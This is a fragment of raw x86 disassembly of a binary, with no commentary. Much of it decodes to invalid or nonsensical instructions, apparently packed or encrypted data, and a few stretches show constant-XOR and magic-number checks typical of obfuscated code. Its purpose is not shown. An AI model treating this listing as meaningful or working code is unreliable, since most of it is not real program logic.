  402135:	push   esi
  402136:	adc    al,0xce
  402138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402139:	test   al,0x72
  40213b:	dec    edi
  40213c:	aas    
  40213d:	es jae 0x40216f
  402140:	into   
  402141:	data16 jnp 0x40215a
  402144:	and    eax,0x26ea51
  402149:	das    
  40214a:	in     eax,dx
  40214b:	push   ds
  40214c:	jbe    0x40219f
  40214e:	(bad)
  402152:	icebp  
  402153:	cmp    DWORD PTR [edx-0x26186b15],ebx
  402159:	pop    esp
  40215a:	sti    
  40215b:	add    DWORD PTR [ebx+0x519ad772],0xffffffe7
  402162:	in     al,dx
  402163:	test   BYTE PTR [ecx+0x60],0x41
  402167:	lock pop esp
  402169:	lock (bad) 
  40216b:	aad    0xe6
  40216d:	(bad)  
  40216e:	nop
  40216f:	push   es
  402170:	mov    ebp,0x32165136
  402175:	inc    ebx
  402176:	ins    DWORD PTR es:[edi],dx
  402177:	sbb    BYTE PTR [eax-0x317dc47b],ah
  40217d:	sbb    cl,ah
  40217f:	and    BYTE PTR [eax],dh
  402181:	fwait
  402182:	mov    ss,WORD PTR [edx+0x6c6b5313]
  402188:	ja     0x40211b
  40218a:	pop    eax
  40218b:	aaa    
  40218c:	mov    ch,0xdd
  40218e:	loop   0x4021f2
  402190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402191:	xor    al,0x5
  402193:	adc    DWORD PTR [eax],esp
  402195:	stos   DWORD PTR es:[edi],eax
  402196:	ror    BYTE PTR ds:0x36c4515b,cl
  40219c:	inc    edi
  40219d:	or     DWORD PTR [ebp+0x32],edx
  4021a0:	mov    esi,0x8cac21e4
  4021a5:	das    
  4021a6:	add    DWORD PTR [edi+0x4015097e],esp
  4021ac:	or     BYTE PTR [edi],dh
  4021ae:	pusha  
  4021af:	pop    eax
  4021b0:	loopne 0x40217b
  4021b2:	xor    DWORD PTR [eax],ebp
  4021b4:	jl     0x40220c
  4021b6:	lock in al,0x30
  4021b9:	mov    ecx,0x504ef28a
  4021be:	xor    al,0x43
  4021c0:	pop    edx
  4021c1:	jle    0x4021e8
  4021c3:	cdq    
  4021c4:	or     BYTE PTR [eax+eiz*1+0x0],dl
  4021c8:	fiadd  WORD PTR [eax-0x18b243b9]
  4021ce:	cmp    DWORD PTR [esi],ebx
  4021d0:	cmc    
  4021d1:	sbb    edx,DWORD PTR [esi+0x47]
  4021d4:	popa   
  4021d5:	rol    BYTE PTR [edx+0x703a2c57],0x31
  4021dc:	push   esp
  4021dd:	pop    esi
  4021de:	inc    esi
  4021df:	add    eax,DWORD PTR [esi-0x500d10a9]
  4021e5:	scas   eax,DWORD PTR es:[edi]
  4021e6:	sbb    dl,BYTE PTR [ebp-0x3d6bb8ba]
  4021ec:	sbb    DWORD PTR [edx+eax*8+0x75],esi
  4021f0:	dec    BYTE PTR [ecx-0x36ad688]
  4021f6:	or     dl,dh
  4021f8:	je     0x402246
  4021fa:	repz cmp BYTE PTR [esi-0x40],dl
  4021fe:	outs   dx,DWORD PTR ds:[esi]
  4021ff:	cmp    edx,ebx
  402201:	cdq    
  402202:	fwait
  402203:	or     esp,ebp
  402205:	(bad)  
  402206:	push   cs
  402207:	mov    al,0xb4
  402209:	jno    0x40224b
  40220b:	rol    BYTE PTR [esi-0x7427b811],0x8a
  402212:	mov    es,WORD PTR [eax]
  402214:	out    dx,al
  402215:	mov    esp,0x738697a
  40221a:	dec    ebx
  40221b:	mov    al,0x2f
  40221d:	adc    BYTE PTR [ebp+ecx*4+0x29],ah
  402221:	je     0x402231
  402223:	pop    ebx
  402224:	xor    edx,DWORD PTR [ecx+0x50]
  402227:	mov    eax,0x64c3d2fc
  40222c:	mov    BYTE PTR [edi],al
  40222e:	push   ecx
  40222f:	adc    al,0x7f
  402231:	add    eax,0x8343a843
  402236:	mov    bh,0x5e
  402238:	xchg   ebx,eax
  402239:	mov    ?,esp
  40223b:	jo     0x4021eb
  40223d:	lock push ebp
  40223f:	popf   
  402240:	inc    edi
  402241:	and    esp,DWORD PTR [edx]
  402243:	leave  
  402244:	or     al,0x1f
  402246:	or     BYTE PTR [eax-0x3cacdf19],0x3c
  40224d:	dec    edi
  40224e:	mov    ecx,esi
  402250:	sahf   
  402251:	push   ds
  402252:	jno    0x402298
  402254:	dec    edi
  402255:	dec    esi
  402256:	xchg   ebp,eax
  402257:	sub    DWORD PTR [ebp-0x59f5960d],0xde5b3d03
  402261:	(bad)  
  402262:	shl    BYTE PTR ds:0x98d9d2ad,0x11
  402269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40226a:	shr    DWORD PTR [ecx+0x78eb9267],cl
  402270:	pop    eax
  402271:	enter  0x340,0xbb
  402275:	test   DWORD PTR [edi],0x48184
  40227b:	add    BYTE PTR [ebx-0x3ecc13bb],cl
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [esi+0x58],edx
  40229c:	pop    ebp
  40229d:	mov    dh,BYTE PTR [eax+0x2]
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	fucomp st(4)
  4022a8:	add    ch,BYTE PTR [eax]
  4022aa:	mov    bh,BYTE PTR [ebx]
  4022ac:	lahf   
  4022ad:	cmp    DWORD PTR [ecx],esi
  4022af:	adc    DWORD PTR [ecx],esi
  4022b1:	xchg   ecx,eax
  4022b2:	adc    eax,0x7bea20ae
  4022b7:	outs   dx,DWORD PTR ds:[esi]
  4022b8:	leave  
  4022b9:	fidivr WORD PTR [esp+edx*8+0x1f]
  4022bd:	ins    DWORD PTR es:[edi],dx
  4022be:	mov    esp,0xe6ded3fe
  4022c3:	sub    BYTE PTR [esi],al
  4022c5:	cmp    BYTE PTR [eax+0x7a],ah
  4022c8:	sub    dh,cl
  4022ca:	cld    
  4022cb:	xchg   esp,eax
  4022cc:	jge    0x4022c5
  4022ce:	jae    0x402266
  4022d0:	xchg   BYTE PTR [esi+0x4b],ch
  4022d3:	in     al,dx
  4022d4:	fild   WORD PTR [edx]
  4022d6:	adc    DWORD PTR [esi-0x7b],ecx
  4022d9:	jo     0x4022b2
  4022db:	iret   
  4022dc:	test   DWORD PTR [edx-0x44c996b7],0x5892b926
  4022e6:	repz xchg ebp,eax
  4022e8:	(bad)  
  4022e9:	out    dx,al
  4022ea:	les    eax,FWORD PTR [ebp+0x5752cfa2]
  4022f0:	bound  ebx,QWORD PTR ds:0xd8e343a5
  4022f6:	gs push edi
  4022f8:	test   BYTE PTR [edx],bh
  4022fa:	cs add al,0x79
  4022fd:	sub    eax,0x367e7b44
  402302:	jb     0x4022ab
  402304:	imul   esi,DWORD PTR [ebp-0x3b6941d5],0x35
  40230b:	scas   al,BYTE PTR es:[edi]
  40230c:	fst    QWORD PTR ds:0xe4908fee
  402312:	pushf  
  402313:	adc    bh,BYTE PTR [ebx+edi*1+0x37b0f770]
  40231a:	jae    0x40230a
  40231c:	mov    ds:0x6cb58873,eax
  402321:	lods   al,BYTE PTR ds:[esi]
  402322:	jne    0x402314
  402324:	inc    ebp
  402325:	iret   
  402326:	fidivr WORD PTR [edx-0x1]
  402329:	shl    DWORD PTR [ecx-0xb],1
  40232c:	push   ecx
  40232d:	lea    edi,[bx+si]
  402330:	jne    0x4023ae
  402332:	mov    ?,WORD PTR [eax+0x710a0b7e]
  402338:	mov    dx,0x4711
  40233c:	imul   DWORD PTR [edx-0x1c70ca2b]
  402342:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402343:	out    0x29,eax
  402345:	ins    BYTE PTR es:[edi],dx
  402346:	sti    
  402347:	pop    eax
  402348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402349:	jae    0x4022f7
  40234b:	or     al,0xa6
  40234d:	xchg   ebp,eax
  40234e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40234f:	leave  
  402350:	xchg   BYTE PTR [ebp-0x45],ch
  402353:	and    eax,0x21ac76b1
  402358:	mov    ebp,0x601791fc
  40235d:	xchg   esp,eax
  40235e:	sub    esi,DWORD PTR [edx]
  402360:	add    BYTE PTR [edi],ch
  402362:	rol    DWORD PTR [edx+0x55f4f73e],1
  402368:	mov    eax,0x41059432
  40236d:	stc    
  40236e:	aas    
  40236f:	inc    ebp
  402370:	sbb    BYTE PTR [edi-0x8],dl
  402373:	(bad)
  402376:	pop    edx
  402377:	mov    eax,0xd4f6aa06
  40237c:	icebp  
  40237d:	add    al,0x77
  40237f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402380:	push   edx
  402381:	outs   dx,BYTE PTR ds:[esi]
  402382:	out    dx,al
  402383:	xchg   edi,eax
  402384:	les    eax,FWORD PTR [ecx+edi*8-0x3]
  402388:	mov    fs,WORD PTR [edi-0x12d0eff6]
  40238e:	push   esi
  40238f:	xor    al,0x63
  402391:	cwde   
  402392:	cmp    al,0xdb
  402394:	push   ebp
  402395:	jecxz  0x4023b4
  402397:	rcl    dh,cl
  402399:	inc    ebp
  40239a:	xor    esp,edi
  40239c:	fldenv [eax-0x42131eb2]
  4023a2:	sbb    edi,DWORD PTR [ebp+0x60]
  4023a5:	into   
  4023a6:	sbb    al,0x11
  4023a8:	fist   WORD PTR [ecx]
  4023aa:	fdiv   QWORD PTR [edx+edi*2-0x25ba2e54]
  4023b1:	fs push eax
  4023b3:	dec    edx
  4023b4:	loope  0x402390
  4023b6:	sub    dh,BYTE PTR [eax]
  4023b8:	xchg   ecx,eax
  4023b9:	push   eax
  4023ba:	fidiv  DWORD PTR [ecx]
  4023bc:	mov    ds:0xa4ab17b7,al
  4023c1:	iret   
  4023c2:	in     eax,0x8e
  4023c4:	push   ebp
  4023c5:	test   eax,0x54f7cc0e
  4023ca:	je     0x402420
  4023cc:	int3   
  4023cd:	and    eax,0xc8195800
  4023d2:	adc    BYTE PTR [ebp-0x25],al
  4023d5:	mov    eax,0xdf60797a
  4023da:	and    edx,0xcd8c95c8
  4023e0:	jb     0x40242f
  4023e2:	fs jp  0x402378
  4023e5:	xchg   esp,eax
  4023e6:	sub    BYTE PTR [edi],0x1a
  4023e9:	fs mov ebp,0x4d47e2b7
  4023ef:	or     BYTE PTR [edi],bl
  4023f1:	lock add bh,ah
  4023f4:	repnz sub edi,DWORD PTR [ecx-0x1d]
  4023f8:	xchg   ebx,eax
  4023f9:	data16 js 0x40247a
  4023fc:	jecxz  0x4023c5
  4023fe:	test   al,0x3a
  402400:	xor    al,0x7d
  402402:	cmp    eax,0x21a87292
  402407:	aaa    
  402408:	mov    edx,0x320edcb1
  40240d:	mov    edi,0x9d07a736
  402412:	loop   0x402397
  402414:	das    
  402415:	jmp    FWORD PTR [ebx-0x68]
  402418:	scas   eax,DWORD PTR es:[edi]
  402419:	xor    BYTE PTR [eax+ebx*8-0x56],ch
  40241d:	mov    esp,DWORD PTR [ebp-0x80]
  402420:	mov    ecx,0x8c275334
  402425:	cld    
  402426:	lods   eax,DWORD PTR ds:[esi]
  402427:	jne    0x40243b
  402429:	je     0x4024a1
  40242b:	lahf   
  40242c:	loope  0x40247e
  40242e:	inc    ecx
  40242f:	push   0x63c534
  402434:	lds    eax,FWORD PTR [edi+esi*8+0x6dd7209a]
  40243b:	scas   eax,DWORD PTR es:[edi]
  40243c:	jne    0x402445
  40243e:	dec    esi
  40243f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402440:	stc    
  402441:	pop    edi
  402442:	or     al,0x94
  402444:	xor    DWORD PTR [esi+edi*1+0x1ed4f36d],edi
  40244b:	dec    esp
  40244c:	add    BYTE PTR [eax+edx*1-0x15],ah
  402450:	or     esi,ebx
  402452:	rcr    BYTE PTR [edx+0x2],cl
  402455:	push   ebx
  402456:	shr    DWORD PTR [ebp-0x6f1691c7],1
  40245c:	out    dx,al
  40245d:	push   cs
  40245e:	enter  0xe741,0x8d
  402462:	gs ja  0x4024c3
  402465:	xchg   esi,eax
  402466:	shr    dh,0x24
  402469:	xor    BYTE PTR [eax],0x8d
  40246c:	shl    DWORD PTR [ecx-0x2e],0x0
  402470:	sbb    al,0xec
  402472:	popf   
  402473:	jae    0x402493
  402475:	sbb    cl,BYTE PTR [ecx+ebx*4-0x1632f38f]
  40247c:	jb     0x4024af
  40247e:	pop    esp
  40247f:	jmp    0x16a1:0xc6ce10f4
  402486:	jg     0x402437
  402488:	test   eax,0xd6b71d52
  40248d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40248e:	and    eax,0x1c1ab4b5
  402493:	sar    dh,1
  402495:	pop    edi
  402496:	cdq    
  402497:	(bad)  
  402499:	xchg   esi,eax
  40249a:	retf   0x97d2
  40249d:	sar    BYTE PTR [ebp-0x54d42e2c],0x19
  4024a4:	xor    al,0xf9
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x63d73e37],cl
  4024f4:	loope  0x402566
  4024f6:	add    BYTE PTR [eax+0x70],dh
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	xor    dl,dh
  4024ff:	cmp    esp,DWORD PTR [edi-0x2e4251ec]
  402505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402506:	sbb    eax,0x2b94461f
  40250b:	cdq    
  40250c:	js     0x4024ce
  40250e:	das    
  40250f:	pusha  
  402510:	sub    al,BYTE PTR ds:0xc6632e2b
  402516:	mov    al,ds:0x8d39cbfa
  40251c:	out    0x7e,al
  40251e:	pop    ss
  40251f:	jae    0x40255e
  402521:	and    DWORD PTR [edx],esp
  402523:	icebp  
  402524:	mov    fs,esp
  402526:	pop    ss
  402527:	jbe    0x402583
  402529:	sbb    bl,cl
  40252b:	pop    ebp
  40252c:	(bad)  
  40252d:	dec    esp
  40252e:	dec    BYTE PTR [edx]
  402530:	in     eax,0x82
  402532:	call   0xa9a8:0x7e968637
  402539:	cmp    ecx,esi
  40253b:	call   0x552f5958
  402540:	jb     0x40257e
  402542:	cmp    al,0xf3
  402544:	jmp    0x72ca:0xdea6c96c
  40254b:	ror    edi,cl
  40254d:	test   DWORD PTR [ebp+0x3ae1c480],ebp
  402553:	loop   0x402568
  402555:	xchg   ecx,eax
  402556:	fwait
  402557:	outs   dx,DWORD PTR ds:[esi]
  402558:	mov    edx,0x77ca0e32
  40255d:	jb     0x4024f9
  40255f:	add    BYTE PTR [edx+0x36a1fa35],ah
  402565:	mov    ecx,0xb2f052cc
  40256a:	xlat   BYTE PTR ds:[ebx]
  40256b:	ret    
  40256c:	xor    BYTE PTR [eax-0x43],ch
  40256f:	(bad)  
  402570:	jns    0x40259d
  402572:	jno    0x4025f3
  402574:	cli    
  402575:	dec    ebx
  402576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402577:	dec    ecx
  402578:	gs pop esi
  40257a:	inc    esp
  40257b:	cmp    al,0x62
  40257d:	pop    ecx
  40257e:	retf   0x6639
  402581:	lock jmp 0x6d12:0x9f8a8b0b
  402589:	xor    DWORD PTR fs:[ebx-0x1561d0fc],esp
  402590:	sbb    edi,DWORD PTR [eax]
  402592:	outs   dx,DWORD PTR ds:[esi]
  402593:	pusha  
  402594:	xchg   edx,eax
  402595:	enter  0x4256,0xda
  402599:	mov    edi,0x866347c0
  40259e:	scas   eax,DWORD PTR es:[edi]
  40259f:	int    0xe0
  4025a1:	push   ecx
  4025a2:	out    dx,eax
  4025a3:	push   ebx
  4025a4:	or     DWORD PTR [ebx-0x57],0xffffffef
  4025a8:	cmp    al,0xda
  4025aa:	aas    
  4025ab:	and    ebx,esp
  4025ad:	(bad)  
  4025ae:	pop    ebp
  4025af:	dec    esi
  4025b0:	fs mov ah,0x2d
  4025b3:	and    eax,0xdcff8ae6
  4025b8:	aam    0x70
  4025ba:	jp     0x402560
  4025bc:	mov    ?,WORD PTR [edx+0x1056a5bd]
  4025c2:	fisub  DWORD PTR [ebx-0x4aea81ae]
  4025c8:	sbb    bh,BYTE PTR [eax-0x7e9b8ce1]
  4025ce:	push   0x461d80fc
  4025d3:	daa    
  4025d4:	pop    esp
  4025d5:	inc    BYTE PTR [eax]
  4025d7:	push   ecx
  4025d8:	outs   dx,BYTE PTR ds:[esi]
  4025d9:	cmp    esp,DWORD PTR [ebp+0x1f6dd639]
  4025df:	lods   eax,DWORD PTR ds:[esi]
  4025e0:	cmp    al,0x7b
  4025e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025e3:	aad    0x69
  4025e5:	jge    0x402592
  4025e7:	ins    DWORD PTR es:[edi],dx
  4025e8:	sub    BYTE PTR [ebp+0x71],dh
  4025eb:	les    ecx,FWORD PTR [edi]
  4025ed:	iret   
  4025ee:	(bad)  
  4025ef:	mov    esp,ebx
  4025f1:	dec    ecx
  4025f2:	stc    
  4025f3:	jge    0x4025c8
  4025f5:	sbb    edx,DWORD PTR [ebx+0x12001cb0]
  4025fb:	gs enter 0xf513,0x5c
  402600:	pop    esp
  402601:	jo     0x4025d8
  402603:	push   0x6a
  402605:	outs   dx,BYTE PTR ds:[esi]
  402606:	gs sub al,0x15
  402609:	push   ebx
  40260a:	adc    DWORD PTR [ecx],0xffffffb3
  40260d:	cs jnp 0x40259c
  402610:	fld    DWORD PTR [edi-0x13]
  402613:	push   esp
  402614:	dec    esi
  402615:	lea    ebp,[ebx]
  402617:	jae    0x402671
  402619:	inc    esp
  40261a:	inc    ecx
  40261b:	stos   DWORD PTR es:[edi],eax
  40261c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40261d:	cs cdq 
  40261f:	das    
  402620:	js     0x402603
  402622:	push   0x34c4905a
  402627:	mov    esp,0x9a45683e
  40262c:	int3   
  40262d:	cli    
  40262e:	adc    esi,DWORD PTR [ecx+0x8]
  402631:	mov    esi,ss
  402633:	sub    BYTE PTR [ebx-0x64521732],0x4
  40263a:	inc    edi
  40263b:	mov    edi,0x7788f1e7
  402640:	jne    0x402670
  402642:	lods   eax,DWORD PTR ds:[esi]
  402643:	dec    esi
  402644:	fild   QWORD PTR [edi+0x6def3e8b]
  40264a:	or     bh,BYTE PTR [ecx+0x41]
  40264d:	test   eax,0x7367e0b5
  402652:	mov    ds:0x1a1b0418,eax
  402657:	cdq    
  402658:	es jno 0x402669
  40265b:	pop    ebx
  40265c:	fistp  QWORD PTR [ebx+0x8]
  40265f:	pop    ecx
  402660:	sub    esi,eax
  402662:	add    eax,0x75b3f917
  402667:	pop    esp
  402668:	ins    BYTE PTR es:[edi],dx
  402669:	xor    BYTE PTR [edx],ah
  40266b:	mov    edi,0x66fc6db7
  402670:	test   ax,0x1192
  402674:	sub    edx,DWORD PTR [edi]
  402676:	jmp    0x95bb:0x14603417
  40267d:	in     al,dx
  40267e:	fcomi  st,st(4)
  402680:	and    BYTE PTR [ebx-0x63],bl
  402683:	and    DWORD PTR [eax-0x30],ebp
  402686:	rol    DWORD PTR [esi+edx*2],cl
  402689:	(bad)  
  40268a:	dec    BYTE PTR [edi]
  40268c:	std    
  40268d:	scas   eax,DWORD PTR es:[edi]
  40268e:	sbb    ah,al
  402690:	test   DWORD PTR [ecx+0x77bd634d],ebx
  402696:	sub    bl,ch
  402698:	dec    esi
  402699:	sub    al,0xbc
  40269b:	push   cs
  40269c:	add    DWORD PTR [eax],ecx
  40269e:	xchg   edx,eax
  40269f:	and    bh,BYTE PTR [ebx+0x7c]
  4026a2:	jno    0x402626
  4026a4:	xor    ch,dl
  4026a6:	pop    esi
  4026a7:	dec    edi
  4026a8:	adc    eax,0x7b934526
  4026ad:	jmp    0x2b633941
  4026b2:	je     0x4026f2
  4026b4:	sbb    eax,edx
  4026b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b7:	nop
  4026b8:	in     eax,0xff
  4026ba:	pop    eax
  4026bb:	(bad)  
  4026bc:	fimul  DWORD PTR [edi]
  4026be:	adc    al,ah
  4026c0:	pop    ebx
  4026c1:	pop    eax
  4026c2:	test   DWORD PTR [eax],ecx
  4026c4:	sub    BYTE PTR [ebp-0x1b],cl
  4026c7:	mov    ah,0x57
  4026c9:	aaa    
  4026ca:	pop    ss
  4026cb:	retf   0xf023
  4026ce:	and    eax,0x3253afca
  4026d3:	push   ecx
  4026d4:	cli    
  4026d5:	add    esi,esi
  4026d7:	int    0xd4
  4026d9:	adc    BYTE PTR [ebx+0x68],bl
  4026dc:	int    0x14
  4026de:	push   es
  4026df:	shl    DWORD PTR [eax-0x57],cl
  4026e2:	pop    es
  4026e3:	cwde   
  4026e4:	test   al,0xc2
  4026e6:	leave  
  4026e7:	cld    
  4026e8:	jle    0x4026bd
  4026ea:	fisub  WORD PTR [ecx+0x69]
  4026ed:	retf   0x89ca
  4026f0:	bound  edx,QWORD PTR [esi]
  4026f2:	fdiv   DWORD PTR [ecx*2+0x5d83fe3f]
  4026f9:	mov    edx,0x8b3af71e
  4026fe:	inc    ebp
  4026ff:	hlt    
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0xb3ce818b
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	cmc    
  402768:	jns    0x402786
  40276a:	dec    edi
  40276b:	cmp    DWORD PTR [eax+0x41],eax
  40276e:	icebp  
  40276f:	and    dh,dh
  402771:	je     0x402781
  402773:	lds    eax,FWORD PTR [ecx+0x22]
  402776:	jl     0x4027a6
  402778:	jmp    0x402789
  40277a:	(bad)  
  40277b:	sti    
  40277c:	inc    edx
  40277d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40277e:	retf   
  40277f:	sub    BYTE PTR [edx],bl
  402781:	iret   
  402782:	outs   dx,BYTE PTR ds:[esi]
  402783:	and    al,0x96
  402785:	(bad)  
  402786:	jecxz  0x4027f5
  402788:	sbb    DWORD PTR [eax+0x2de0e8c2],ecx
  40278e:	int    0xcf
  402790:	and    al,0x8e
  402792:	xlat   BYTE PTR ds:[ebx]
  402793:	data16 jl 0x402793
  402796:	dec    ebp
  402797:	push   edx
  402798:	and    dh,BYTE PTR [esi+0x76cf312e]
  40279e:	fbstp  TBYTE PTR [ebx+0x20341a71]
  4027a4:	push   esi
  4027a5:	add    eax,0x36a65ca5
  4027aa:	adc    al,0xe
  4027ac:	sub    eax,0xb7be1206
  4027b1:	pop    ebp
  4027b2:	inc    edx
  4027b3:	mov    eax,0x33ef89a2
  4027b8:	xchg   esi,eax
  4027b9:	(bad)  
  4027ba:	loope  0x4027d1
  4027bc:	sub    edi,DWORD PTR [ecx+0x638f61a7]
  4027c2:	jmp    edi
  4027c4:	or     al,0x23
  4027c6:	push   ebx
  4027c7:	enter  0x9797,0x3a
  4027cb:	out    dx,eax
  4027cc:	push   0x3a088b57
  4027d1:	outs   dx,BYTE PTR ds:[esi]
  4027d2:	test   eax,0xe5d4621c
  4027d7:	outs   dx,DWORD PTR ds:[esi]
  4027d8:	std    
  4027d9:	dec    edx
  4027da:	mov    edi,0x5e099bf0
  4027df:	mov    dh,0x4b
  4027e1:	in     eax,dx
  4027e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027e3:	inc    esp
  4027e4:	jl     0x40277d
  4027e6:	aam    0xa1
  4027e8:	dec    edi
  4027e9:	lods   eax,DWORD PTR ds:[esi]
  4027ea:	mov    edi,0xb377d8bb
  4027ef:	inc    ebp
  4027f0:	lock push ebp
  4027f2:	inc    esp
  4027f3:	push   edx
  4027f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f5:	retf   
  4027f6:	xor    esp,DWORD PTR [edx-0x8]
  4027f9:	add    DWORD PTR [esi-0x3f],edx
  4027fc:	push   edx
  4027fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027fe:	adc    BYTE PTR [esi],al
  402800:	xor    al,0x53
  402802:	adc    ecx,DWORD PTR [edx]
  402804:	sahf   
  402805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402806:	jmp    0x4027f1
  402808:	xchg   edx,eax
  402809:	(bad)  
  40280a:	loope  0x402799
  40280c:	mov    al,0x35
  40280e:	iret   
  40280f:	adc    al,0xd1
  402811:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402812:	and    BYTE PTR [ebp+0x6191db6d],0xbd
  402819:	push   esi
  40281a:	mov    es,edx
  40281c:	lea    edi,[ecx+0x1f907a0b]
  402822:	out    0x40,eax
  402824:	cli    
  402825:	je     0x4027cb
  402827:	mov    al,0xe2
  402829:	mov    ecx,0x23920077
  40282e:	pop    eax
  40282f:	push   ss
  402830:	imul   ebp,DWORD PTR [edi+0x36d8255e],0xc7b770d5
  40283a:	adc    cl,BYTE PTR [ebp+0x4544c78b]
  402840:	out    dx,eax
  402841:	leave  
  402842:	test   eax,0xeb6929ed
  402847:	(bad)  
  402848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402849:	push   es
  40284a:	mov    ebx,0xaf7450c7
  40284f:	add    dh,BYTE PTR [ebx]
  402851:	push   es
  402852:	add    bl,dl
  402854:	call   0x21dd3edb
  402859:	or     al,0xf4
  40285b:	mov    ?,WORD PTR [eax-0x52]
  40285e:	mov    eax,ds:0x5839328a
  402863:	imul   eax,DWORD PTR ds:0xea95d854,0x86f5e950
  40286d:	sub    al,0x6a
  40286f:	mov    ds:0x3ee01965,eax
  402874:	test   eax,0xefc20046
  402879:	mov    al,0xde
  40287b:	cmc    
  40287c:	mov    es,bx
  40287f:	mov    DWORD PTR [ebp-0x5f],0x1b26244e
  402886:	mov    esi,0x3b31a029
  40288b:	hlt    
  40288c:	or     eax,DWORD PTR [edi-0x730b330e]
  402892:	pop    ebp
  402893:	push   0x3a
  402895:	enter  0xe1f9,0xb7
  402899:	and    dl,BYTE PTR [ebx]
  40289b:	pushf  
  40289c:	adc    cl,ah
  40289e:	mov    esp,0x29769560
  4028a3:	test   eax,0xab96bab3
  4028a8:	inc    ecx
  4028a9:	sub    bh,BYTE PTR [ecx]
  4028ab:	push   0x2af09d90
  4028b0:	cmp    DWORD PTR [ebx+0x19dcb8ec],edx
  4028b6:	je     0x402913
  4028b8:	adc    al,0xef
  4028ba:	shl    BYTE PTR [ebx],1
  4028bc:	mov    ?,WORD PTR [esi+0xd]
  4028bf:	clc    
  4028c0:	or     bh,bh
  4028c2:	mov    ds:0xde955b41,al
  4028c7:	popa   
  4028c8:	lods   eax,DWORD PTR ds:[esi]
  4028c9:	in     eax,0x48
  4028cb:	sahf   
  4028cc:	lds    edi,FWORD PTR [eax]
  4028ce:	bnd ja 0x402950
  4028d1:	jge    0x4028bd
  4028d3:	jmp    0xff0bd826
  4028d8:	dec    DWORD PTR [edx]
  4028da:	add    al,0x81
  4028dc:	xor    al,0x70
  4028de:	aas    
  4028df:	adc    al,0x41
  4028e1:	das    
  4028e2:	adc    al,0xb2
  4028e4:	das    
  4028e5:	mov    BYTE PTR [ecx-0x2],ch
  4028e8:	jb     0x4028f0
  4028ea:	aas    
  4028eb:	xor    ch,0xac
  4028ee:	sbb    DWORD PTR [ebp+0x23a9c9b9],0x49
  4028f5:	shl    DWORD PTR [eax+0x3df88831],0x13
  4028fc:	pushf  
  4028fd:	ja     0x40288a
  4028ff:	jmp    0xa677a1a8
  402904:	mov    bh,0xda
  402906:	jl     0x4028e3
  402908:	jne    0x402920
  40290a:	pop    ecx
  40290b:	ds xchg edx,eax
  40290d:	sub    eax,0xdc65177e
  402912:	pop    ebp
  402913:	jmp    0x81d2:0xf2bd3f2b
  40291a:	mov    ebx,DWORD PTR [edi+eiz*4]
  40291d:	inc    ecx
  40291e:	mov    ebx,0xa796806
  402923:	dec    eax
